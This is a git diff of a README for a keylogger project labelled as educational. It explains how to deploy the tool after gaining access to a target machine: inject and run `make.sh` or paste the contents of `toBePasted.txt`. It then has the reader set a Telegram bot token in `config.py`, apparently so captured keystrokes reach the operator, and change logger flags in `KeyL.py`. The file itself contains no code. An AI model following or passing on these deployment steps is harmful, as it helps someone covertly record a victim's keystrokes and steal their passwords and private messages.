@@ -10,16 +10,16 @@ This project of a Key Logger is for **educational purposes**, it has been create
 ## How2UseIt
 
 Once you gain access to the target machine, you have to options:
-1. execute the `make.sh` .
-2. copy and paste the content of `toBePasted.txt` .
+1. Inject and execute the `make.sh` .
+2. Paste and execute the content of `toBePasted.txt` .
 
-You need to configure it for your own setup. Here's how:
+But before you need to configure it for your own setup. Here's how:
 
-1. **Set Your Telegram Token** (Mandatory) 
+1. **Set Your Telegram Token (Mandatory)**  
    Open `config.py` and insert your Telegram bot token.  
    > If you’re unsure how to get one, just ask ChatGPT or refer to the [Telegram Bot API docs](https://core.telegram.org/bots).
 
-2. **Customize Logger Behavior**  (Optional)
+2. **Customize Logger Behavior (Optional)**  
    You can configure the logger by modifying flags inside `KeyL.py`.  
    If you make changes, you'll need to build your own version to install.
 
